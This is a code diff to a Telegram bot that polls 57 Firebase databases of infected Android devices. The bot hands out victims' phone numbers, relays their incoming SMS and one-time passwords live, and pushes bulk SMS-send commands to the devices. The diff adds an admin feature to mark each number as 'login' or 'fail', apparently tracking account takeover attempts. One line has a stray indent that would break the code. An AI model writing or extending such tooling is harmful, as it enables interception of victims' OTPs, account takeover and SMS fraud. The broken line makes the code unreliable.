@@ -56,6 +56,10 @@ user_action_locks = {}       # user_id: asyncio.Lock (Prevents double-click race
 global_seen_ids = set()      # Stores "{fb_url}_{dev_id}_{msg_key_or_id}"
 global_seen_content = {}     # Stores "{dev_id}_{sender}_{msg_hash}": timestamp (60s window)
 
+# Admin number state cache (num -> "login"|"fail"); refreshed lazily
+admin_marks_cache = {}       # num: {"status": "login"|"fail", "fb_url": ..., "dev_id": ...}
+admin_marks_loaded_at = 0
+
 # Shared HTTP Session for high speed across 57 DBs
 http_session: aiohttp.ClientSession = None
 
@@ -111,6 +115,16 @@ async def post_json(url, payload, timeout_secs=5):
         pass
     return False
 
+async def patch_json(url, payload, timeout_secs=5):
+    session = await get_http_session()
+    try:
+        async with session.patch(f"{url}.json", json=payload, timeout=timeout_secs) as response:
+            return response.status == 200
+    except Exception:
+        pass
+    return False
+
+
 async def log_action_to_firebase(user_id, user_name, action, details=""):
     """Logs every bot action to the /mobiledevice node in YOUR personal database."""
     if not MY_DB_URL:
@@ -125,6 +139,50 @@ async def log_action_to_firebase(user_id, user_name, action, details=""):
         "details": details
     }
     asyncio.create_task(post_json(f"{MY_DB_URL}/mobiledevice", payload))
+
+
+# --- Admin Number Mark Store (fail/login) ---
+async def refresh_admin_marks_cache(force=False):
+    """Load all marked numbers from MY_DB_URL/admin_number_marks into memory."""
+    global admin_marks_cache, admin_marks_loaded_at
+    if not MY_DB_URL:
+        return
+    if not force and (time.time() - admin_marks_loaded_at) < 20 and admin_marks_cache:
+        return
+    data = await fetch_json(f"{MY_DB_URL}/admin_number_marks")
+    new_cache = {}
+    if isinstance(data, dict):
+        for num, entry in data.items():
+            if isinstance(entry, dict):
+                status = str(entry.get("status", "")).lower()
+                if status in ("login", "fail"):
+                    new_cache[str(num)] = {
+                        "status": status,
+                        "fb_url": entry.get("fb_url", ""),
+                        "dev_id": entry.get("dev_id", ""),
+                    }
+    admin_marks_cache = new_cache
+    admin_marks_loaded_at = time.time()
+
+
+async def mark_admin_number(number, status, fb_url, dev_id, marked_by_name):
+    """Save a number's status into MY_DB_URL/admin_number_marks/{number}."""
+    if not MY_DB_URL:
+        return False
+    ist_tz = timezone(timedelta(hours=5, minutes=30))
+    payload = {
+        "status": status,
+        "fb_url": fb_url,
+        "dev_id": dev_id,
+        "marked_at": int(time.time() * 1000),
+        "marked_at_readable": datetime.now(ist_tz).strftime('%Y-%m-%d %H:%M:%S'),
+        "marked_by": ADMIN_CHAT_ID,
+        "marked_by_name": marked_by_name,
+    }
+    ok = await put_json(f"{MY_DB_URL}/admin_number_marks/{number}", payload)
+    if ok:
+        admin_marks_cache[number] = {"status": status, "fb_url": fb_url, "dev_id": dev_id}
+    return ok
 
 
 # --- Data Normalization & Schema Parsers ---
@@ -144,12 +202,10 @@ def extract_client_number(client_data):
     """Extracts mobile number across all 57 DB schema variations."""
     if not isinstance(client_data, dict):
         return None
-    # 1. Direct keys
     for key in ('mobNo', 'mobile', 'phoneNumber', 'number', 'sim1'):
         num = clean_mobile_number(client_data.get(key))
         if num:
             return num
-    # 2. Nested 'sims' list or dict
     sims = client_data.get('sims')
     if isinstance(sims, list):
         for sim in sims:
@@ -187,7 +243,6 @@ def get_latest_timestamp(client_data, device_ping_data=None):
         if str(joined).isdigit():
             timestamps.append(int(joined))
 
-    # Check fallback /devices/{dev_id}/ping node if present
     if isinstance(device_ping_data, dict):
         p_obj = device_ping_data.get('ping', {})
         if isinstance(p_obj, dict):
@@ -196,21 +251,17 @@ def get_latest_timestamp(client_data, device_ping_data=None):
                 timestamps.append(int(ts))
 
     max_ts = max(timestamps)
-    # Convert 10-digit second timestamps to 13-digit milliseconds if needed
     if 1_000_000_000 < max_ts < 10_000_000_000:
         max_ts *= 1000
 
-    # Some DBs (e.g., matrixpannel18, bihari-3) only have 'status': True/'online' without timestamps
     if max_ts == 0 and isinstance(client_data, dict):
         status = client_data.get('status')
         if status is True or str(status).lower() in ('online', 'true', 'active', '1'):
-            # Give a fallback recent timestamp (15 mins ago) so it's picked up if no timestamped device beats it
             max_ts = int((time.time() - 900) * 1000)
 
     return max_ts
 
 def parse_messages(raw_data):
-    """Safely extracts messages from Firebase dicts or lists."""
     msgs = []
     if isinstance(raw_data, dict):
         for k, v in raw_data.items():
@@ -223,23 +274,14 @@ def parse_messages(raw_data):
     return msgs
 
 def is_incoming_sms(msg_dict):
-    """Strictly filters out outgoing bulk SMS while supporting all incoming schemas."""
     msg_type = str(msg_dict.get('type', 'incoming')).lower().strip()
     if msg_type in ('outgoing', 'sent', 'out', '2'):
         return False
-    # If explicitly has outgoing webhook fields without incoming sender
     if 'isSended' in msg_dict or '_wake' in msg_dict:
         return False
     return True
 
 def is_duplicate_sms(fb_url, dev_id, fb_key, msg_dict, record_only=False):
-    """
-    Prevents the 3x duplicate OTP bug.
-    Android clients often push the same SMS 2-3 times under different keys:
-    1) SQLite cursor ID (e.g., '2789')
-    2) BroadcastReceiver timestamp (e.g., '1793040198509')
-    3) ContentObserver timestamp 400ms later (e.g., '1793040198975')
-    """
     inner_id = str(msg_dict.get('id', '')).strip()
     key_id = str(fb_key).strip()
 
@@ -259,24 +301,20 @@ def is_duplicate_sms(fb_url, dev_id, fb_key, msg_dict, record_only=False):
             global_seen_content[content_sig] = now
         return True
 
-    # 1. Check strict key or ID match
     if uid_key in global_seen_ids or uid_inner in global_seen_ids:
         return True
 
-    # 2. Check content signature within the last 60 seconds
     if text and content_sig in global_seen_content:
         if now - global_seen_content[content_sig] < 60:
             global_seen_ids.add(uid_key)
             global_seen_ids.add(uid_inner)
             return True
 
-    # Mark as seen immediately
     global_seen_ids.add(uid_key)
     global_seen_ids.add(uid_inner)
     if text:
         global_seen_content[content_sig] = now
 
-    # Periodic cleanup of old content hashes
     if len(global_seen_content) > 5000:
         cutoff = now - 120
         for k in [k for k, ts in global_seen_content.items() if ts < cutoff]:
@@ -288,6 +326,9 @@ def is_duplicate_sms(fb_url, dev_id, fb_key, msg_dict, record_only=False):
 # --- Authorization & UI Helpers ---
 def is_authorized(user_id):
     return user_id in ACCESS_USERS and user_id not in BLOCKED_USERS
+
+def is_admin(user_id):
+    return ADMIN_CHAT_ID != 0 and user_id == ADMIN_CHAT_ID
 
 def cancel_user_otp_task(user_id):
     session = active_otp_sessions.pop(user_id, None)
@@ -384,6 +425,28 @@ async def cmd_cancelsend(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except (IndexError, ValueError):
         await update.message.reply_text("Usage: /cancelsend <chat_id>")
 
+async def cmd_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """/login — Show all numbers marked as LOGIN by admin."""
+    if update.effective_user.id != ADMIN_CHAT_ID:
+        return
+    await refresh_admin_marks_cache(force=True)
+    login_nums = [(n, v) for n, v in admin_marks_cache.items() if v.get("status") == "login"]
+    if not login_nums:
+        await update.message.reply_text("No numbers marked as LOGIN yet.")
+        return
+    login_nums.sort(key=lambda x: x[0])
+    lines = [f"✅ <b>Numbers marked LOGIN:</b> {len(login_nums)}\n"]
+    for num, entry in login_nums:
+        fb = entry.get("fb_url", "")
+        # show shortened db identifier
+        db_tag = fb.split("//")[-1].split(".")[0] if fb else "?"
+        lines.append(f"• <code>{num}</code> — <i>{html.escape(db_tag)}</i>")
+    text = "\n".join(lines)
+    if len(text) > 4000:
+        text = text[:4000] + "\n…(truncated)"
+    await update.message.reply_text(text, parse_mode="HTML")
+    await log_action_to_firebase(ADMIN_CHAT_ID, "Admin", "LISTED_LOGIN_NUMBERS", f"Count: {len(login_nums)}")
+
 async def cmd_admin_send(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_CHAT_ID:
         return ConversationHandler.END
@@ -414,55 +477,93 @@ async def admin_forward_payload(update: Update, context: ContextTypes.DEFAULT_TY
 async def handle_get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE, is_new=False):
     query = update.callback_query
     user = query.from_user
+    admin_mode = is_admin(user.id)
 
-    # Prevent rapid double-click race conditions from spawning 2-3 parallel tasks
     lock = user_action_locks.setdefault(user.id, asyncio.Lock())
     if lock.locked():
         return
 
-    async with lock:
-        # Cancel any previous OTP task immediately
-        cancel_user_otp_task(user.id)
-
+    # helper: emit/update status depending on admin mode
+    status_message = None
+    async def show_status(text, kb=None):
+        nonlocal status_message
         try:
-            await query.edit_message_text("Searching provider databases for an active number... ⏳")
+            if admin_mode:
+                status_message = await context.bot.send_message(
+                    chat_id=query.message.chat_id,
+                    text=text,
+                    parse_mode="HTML",
+                    reply_markup=kb if kb is not None else None
+                )
+            else:
+                await query.edit_message_text(text, reply_markup=kb)
+                status_message = query.message
         except Exception:
             pass
+
+    async with lock:
+        cancel_user_otp_task(user.id)
+
+        await show_status("Searching provider databases for an active number... ⏳")
+
+        # Refresh admin marks if this is admin
+        if admin_mode:
+            await refresh_admin_marks_cache(force=True)
+            failed_set = {n for n, v in admin_marks_cache.items() if v.get("status") == "fail"}
+        else:
+            failed_set = set()
 
         fetch_tasks = [fetch_json(f"{fb_url}/clients") for fb_url in FIREBASE_URLS]
         results = await asyncio.gather(*fetch_tasks)
 
         now_ms = int(time.time() * 1000)
-        all_active_devices = []
-        seen_numbers = set()
-        time_window_mins = 10
 
-        while time_window_mins <= 1440:
-            cutoff_ms = now_ms - (time_window_mins * 60 * 1000)
-
+        def collect_devices(cutoff_ms, seen_numbers, exclude_set):
+            found = []
             for fb_url, clients_data in zip(FIREBASE_URLS, results):
                 if not clients_data or not isinstance(clients_data, dict):
                     continue
                 for dev_id, client in clients_data.items():
                     ts = get_latest_timestamp(client)
-                    if ts >= cutoff_ms:
-                        valid_num = extract_client_number(client)
-                        if valid_num and valid_num not in seen_numbers:
-                            seen_numbers.add(valid_num)
-                            all_active_devices.append({
-                                'fb_url': fb_url,
-                                'dev_id': dev_id,
-                                'num': valid_num,
-                                'ts': ts
-                            })
+                    if ts < cutoff_ms:
+                        continue
+                    valid_num = extract_client_number(client)
+                    if not valid_num:
+                        continue
+                    if valid_num in exclude_set:
+                        continue
+                    if valid_num in seen_numbers:
+                        continue
+                    seen_numbers.add(valid_num)
+                    found.append({
+                        'fb_url': fb_url,
+                        'dev_id': dev_id,
+                        'num': valid_num,
+                        'ts': ts
+                    })
+            return found
 
-            if all_active_devices:
-                break
-            time_window_mins += 30
+        all_active_devices = []
+        seen_numbers = set()
+
+        if admin_mode:
+            # Admin: 10-minute steps up to 60 minutes, skipping failed numbers
+            for window in range(10, 61, 10):
+                cutoff_ms = now_ms - (window * 60 * 1000)
+                all_active_devices = collect_devices(cutoff_ms, seen_numbers, failed_set)
+                if all_active_devices:
+                    break
+        else:
+            # Non-admin: original fallback windows
+            for window in (10, 40, 70, 100, 130, 160, 190, 220, 250, 280, 310, 340, 370, 400, 430, 460, 490, 520, 550, 580, 610, 640, 670, 700, 730, 760, 790, 820, 850, 880, 910, 940, 970, 1000, 1030, 1060, 1090, 1120, 1150, 1180, 1210, 1240, 1270, 1300, 1330, 1360, 1390, 1420, 1440):
+                cutoff_ms = now_ms - (window * 60 * 1000)
+                all_active_devices = collect_devices(cutoff_ms, seen_numbers, failed_set)
+                if all_active_devices:
+                    break
 
         if not all_active_devices:
             try:
-                await query.edit_message_text("❌ No active numbers found.", reply_markup=get_main_menu())
+                await show_status("❌ No active numbers found.", kb=get_main_menu())
             except Exception:
                 pass
             return
@@ -486,22 +587,31 @@ async def handle_get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE, is_
 
         action = "Requested New Number" if is_new else "Requested OTP"
         await log_action_to_firebase(user.id, user.first_name, action, f"Allocated Number: {selected['num']}")
-        await notify_admin(context, f"User <b>{html.escape(user.first_name)}</b> ({user.id}) {action}: <code>{selected['num']}</code>")
+        if not admin_mode:
+            await notify_admin(context, f"User <b>{html.escape(user.first_name)}</b> ({user.id}) {action}: <code>{selected['num']}</code>")
 
-        kb = [
-            [InlineKeyboardButton("Get New Number 🔄", callback_data="get_new_number")],
-            [InlineKeyboardButton("Cancel Number ❌", callback_data="cancel_number")]
-        ]
-        try:
-            await query.edit_message_text(
-                f"✅ <b>Number Found:</b> <code>{selected['num']}</code>\n"
-                f"Status: <b>Valid for 5 Minutes</b> ⏱️\n"
-                f"Send your SMS. New messages will appear here.",
-                reply_markup=InlineKeyboardMarkup(kb),
-                parse_mode="HTML"
-            )
-        except Exception:
-            pass
+        if admin_mode:
+            kb = [
+                [InlineKeyboardButton("Get New Number 🔄", callback_data="get_new_number")],
+                [
+                    InlineKeyboardButton("Login ✅", callback_data=f"admin_login_{selected['num']}"),
+                    InlineKeyboardButton("Fail ❌", callback_data=f"admin_fail_{selected['num']}"),
+                ],
+                [InlineKeyboardButton("Cancel Number ❌", callback_data="cancel_number")],
+            ]
+        else:
+            kb = [
+                [InlineKeyboardButton("Get New Number 🔄", callback_data="get_new_number")],
+                [InlineKeyboardButton("Cancel Number ❌", callback_data="cancel_number")],
+            ]
+
+        shown_text = (
+            f"✅ <b>Number Found:</b> <code>{selected['num']}</code>\n"
+            f"Status: <b>Valid for 5 Minutes</b> ⏱️\n"
+            f"Send your SMS. New messages will appear here."
+        )
+
+        await show_status(shown_text, kb=InlineKeyboardMarkup(kb))
 
         session_id = int(time.time() * 1000)
         task = asyncio.create_task(
@@ -518,10 +628,10 @@ async def handle_get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE, is_
         )
         active_otp_sessions[user.id] = {"task": task, "session_id": session_id}
 
+
 async def monitor_otp(context, user_id, chat_id, fb_url, dev_id, mobile_number, duration_secs, session_id):
     end_time = time.time() + duration_secs
 
-    # Baseline snapshot: mark all existing messages as seen (both ID and content hash)
     initial_raw = await fetch_json(f"{fb_url}/messages/{dev_id}")
     initial_msgs = parse_messages(initial_raw)
     for k, m in initial_msgs:
@@ -529,7 +639,6 @@ async def monitor_otp(context, user_id, chat_id, fb_url, dev_id, mobile_number, 
 
     try:
         while time.time() < end_time:
-            # Verify this task is still the user's active session
             current_session = active_otp_sessions.get(user_id)
             if not current_session or current_session.get("session_id") != session_id:
                 return
@@ -563,7 +672,6 @@ async def monitor_otp(context, user_id, chat_id, fb_url, dev_id, mobile_number, 
 
             await asyncio.sleep(2.5)
 
-        # Only send expiration notice if this session wasn't replaced
         current_session = active_otp_sessions.get(user_id)
         if current_session and current_session.get("session_id") == session_id:
             active_otp_sessions.pop(user_id, None)
@@ -578,6 +686,64 @@ async def monitor_otp(context, user_id, chat_id, fb_url, dev_id, mobile_number, 
         pass
     except Exception as e:
         logging.error(f"Monitor error: {e}")
+
+
+# --- Admin: Mark Number Login / Fail ---
+async def handle_admin_mark(update: Update, context: ContextTypes.DEFAULT_TYPE, status: str):
+    query = update.callback_query
+    user = query.from_user
+    if not is_admin(user.id):
+        return
+    await query.answer()
+
+    # callback_data format: admin_login_<num> or admin_fail_<num>
+    prefix = "admin_login_" if status == "login" else "admin_fail_"
+    number = query.data[len(prefix):].strip()
+    number = clean_mobile_number(number)
+    if not number:
+        await query.edit_message_text("❌ Invalid number in callback.", reply_markup=get_main_menu())
+        return
+
+    # Look up the fb_url/dev_id for this num from currently active scan (cached in user_data or marks)
+    fb_url = ""
+    dev_id = ""
+
+    # Try to find it in the last fetched device list by scanning again (light call)
+    fetch_tasks = [fetch_json(f"{f}/clients") for f in FIREBASE_URLS]
+    results = await asyncio.gather(*fetch_tasks)
+    for f_url, clients_data in zip(FIREBASE_URLS, results):
+        if not isinstance(clients_data, dict):
+            continue
+        for d_id, client in clients_data.items():
+            if extract_client_number(client) == number:
+                fb_url = f_url
+                dev_id = d_id
+                break
+        if fb_url:
+            break
+
+    ok = await mark_admin_number(number, status, fb_url, dev_id, user.first_name)
+
+        label = "✅ LOGIN" if status == "login" else "❌ FAIL"
+    result_note = "Saved to DB." if ok else "⚠️ Failed to save to MY_DB_URL (check env)."
+    try:
+        await query.edit_message_text(
+            f"{label} — Number <code>{number}</code> {result_note}\n"
+            f"This number will not be shown to you again as active.",
+            parse_mode="HTML",
+            reply_markup=get_main_menu()
+        )
+    except Exception:
+        pass
+
+    # Cancel any active monitoring session for this number
+    cancel_user_otp_task(user.id)
+
+    await log_action_to_firebase(
+        user.id, user.first_name,
+        "ADMIN_MARKED_" + status.upper(),
+        f"Number: {number} | fb_url: {fb_url} | dev_id: {dev_id}"
+    )
 
 
 # --- Get Message on Specific Number Flow ---
@@ -606,7 +772,6 @@ async def fetch_specific_number(update: Update, context: ContextTypes.DEFAULT_TY
     fetch_tasks = [fetch_json(f"{fb_url}/clients") for fb_url in FIREBASE_URLS]
     results = await asyncio.gather(*fetch_tasks)
 
-    # Search across all databases and pick the most recently active matching device
     matching_devices = []
     for fb_url, clients_data in zip(FIREBASE_URLS, results):
         if not clients_data or not isinstance(clients_data, dict):
@@ -633,7 +798,6 @@ async def fetch_specific_number(update: Update, context: ContextTypes.DEFAULT_TY
     raw_msgs = await fetch_json(f"{fb_url}/messages/{dev_id}")
     parsed_msgs = parse_messages(raw_msgs)
 
-    # Deduplicate history so the last 10 messages don't show 3x repeats either
     unique_history = []
     seen_hist_sigs = set()
     sorted_msgs = sorted(
@@ -658,7 +822,6 @@ async def fetch_specific_number(update: Update, context: ContextTypes.DEFAULT_TY
         msg_history += f"[{dt}] <b>{sdr}:</b> <code>{txt}</code>\n\n"
     msg_history += "📡 <b>Starting Real-Time Listening (5 Mins)...</b>"
 
-    # Prevent Telegram 4096 char limit error
     if len(msg_history) > 4000:
         msg_history = msg_history[-4000:]
 
@@ -717,10 +880,6 @@ async def process_sending(update: Update, context: ContextTypes.DEFAULT_TYPE):
     return ConversationHandler.END
 
 async def trigger_send_sms(fb_url, dev_id, payload):
-    """
-    Writes the SMS command to both standard and root-level webhook paths
-    to support all 57 database schemas (e.g., matrixpannel, rahul, alok, sk-admin).
-    """
     path1 = f"{fb_url}/clients/{dev_id}/webhookEvent/sendSms"
     path2 = f"{fb_url}/{dev_id}/webhookEvent/sendSms"
     res1, res2 = await asyncio.gather(
@@ -743,7 +902,6 @@ async def run_batch_send(context, user, target_number, msg_text, quantity, statu
     now_ms = int(time.time() * 1000)
     active_devices = []
 
-    # Expand search window if no devices found in last 10 mins
     for window_mins in (10, 30, 120, 1440):
         cutoff_ms = now_ms - (window_mins * 60 * 1000)
         for fb_url, clients_data in zip(FIREBASE_URLS, results):
@@ -839,11 +997,17 @@ async def callback_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await log_action_to_firebase(user.id, user.first_name, "CANCELLED_OTP")
     elif data == "stop_sending":
         cancel_user_send_task(user.id)
+    elif data.startswith("admin_login_") and is_admin(user.id):
+        await handle_admin_mark(update, context, "login")
+    elif data.startswith("admin_fail_") and is_admin(user.id):
+        await handle_admin_mark(update, context, "fail")
 
 
 # --- Application Startup & Shutdown Hooks ---
 async def post_init(application: Application):
     await get_http_session()
+    # Prime admin marks cache so first /login is instant
+    asyncio.create_task(refresh_admin_marks_cache(force=True))
     asyncio.create_task(start_web_server())
 
 async def post_shutdown(application: Application):
@@ -870,6 +1034,7 @@ def main():
     app.add_handler(CommandHandler("block", cmd_block))
     app.add_handler(CommandHandler("release", cmd_release))
     app.add_handler(CommandHandler("cancelsend", cmd_cancelsend))
+    app.add_handler(CommandHandler("login", cmd_login))
 
     # Send Message Conversation
     send_conv = ConversationHandler(
